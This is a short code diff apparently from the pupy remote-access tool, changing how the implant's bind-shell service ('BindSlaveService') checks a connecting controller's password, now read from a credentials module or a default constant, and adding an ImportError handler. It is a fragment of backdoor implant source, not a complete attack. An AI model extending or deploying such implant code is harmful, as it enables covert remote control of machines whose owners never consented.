@@ -44,6 +44,8 @@ import logging
 import shlex
 try:
     import additional_imports #additional imports needed to package with pyinstaller
+except ImportError:
+    pass
 except Exception as e:
     logging.warning(e)
 logging.getLogger().setLevel(logging.ERROR)
@@ -105,7 +107,13 @@ class BindSlaveService(ReverseSlaveService):
         self.exposed_namespace = {}
         self._conn._config.update(REVERSE_SLAVE_CONF)
         import pupy
-        if self._conn.root.get_password() != pupy.infos['launcher_inst'].args.password:
+        try:
+            from pupy_credentials import BIND_PAYLOADS_PASSWORD
+            password=BIND_PAYLOADS_PASSWORD
+        except:
+            from network.transports import DEFAULT_BIND_PAYLOADS_PASSWORD
+            password=DEFAULT_BIND_PAYLOADS_PASSWORD
+        if self._conn.root.get_password() != password:
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
         self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
